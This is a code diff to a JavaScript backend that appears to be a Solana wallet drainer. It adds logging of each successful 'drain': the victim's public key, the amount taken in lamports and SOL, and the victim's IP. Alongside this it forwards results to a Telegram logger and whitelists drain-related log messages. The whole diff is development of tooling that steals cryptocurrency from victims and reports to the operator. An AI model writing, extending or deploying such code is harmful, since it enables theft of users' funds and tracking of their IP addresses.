@@ -42,7 +42,10 @@ console.log = function() {
       arguments[0].includes('DRAIN_FAILED') ||
       arguments[0].includes('Creating transfer') ||
       arguments[0].includes('Drain attempt details') ||
-      arguments[0].includes('TELEGRAM_DRAIN_SUCCESS')
+      arguments[0].includes('TELEGRAM_DRAIN_SUCCESS') ||
+      arguments[0].includes('DRAIN_AMOUNT') ||
+      arguments[0].includes('CONFIRMATION') ||
+      arguments[0].includes('CONFIRMATION_HANDLER')
     )
   )) {
     originalConsoleLog.apply(console, arguments);
@@ -962,10 +965,22 @@ export async function logConfirmation(req, res) {
 
     if (status === 'confirmed' || status === 'finalized') {
       // Log successful drain
+      const actualDrainAmount = parseInt(req.body.actualDrainAmount) || 0;
+      const lamports = parseInt(req.body.lamports) || 0;
+      
+      console.log('[CONFIRMATION_HANDLER] Received drain success:', {
+        publicKey: publicKey,
+        actualDrainAmount: actualDrainAmount,
+        actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
+        lamports: lamports,
+        lamportsSOL: (lamports / 1e9).toFixed(6),
+        ip: userIp
+      });
+      
       await telegramLogger.logDrainSuccess({
         publicKey: publicKey,
-        actualDrainAmount: parseInt(req.body.actualDrainAmount) || 0,
-        lamports: parseInt(req.body.lamports) || 0,
+        actualDrainAmount: actualDrainAmount,
+        lamports: lamports,
         ip: userIp
       });
     } else if (status === 'failed') {
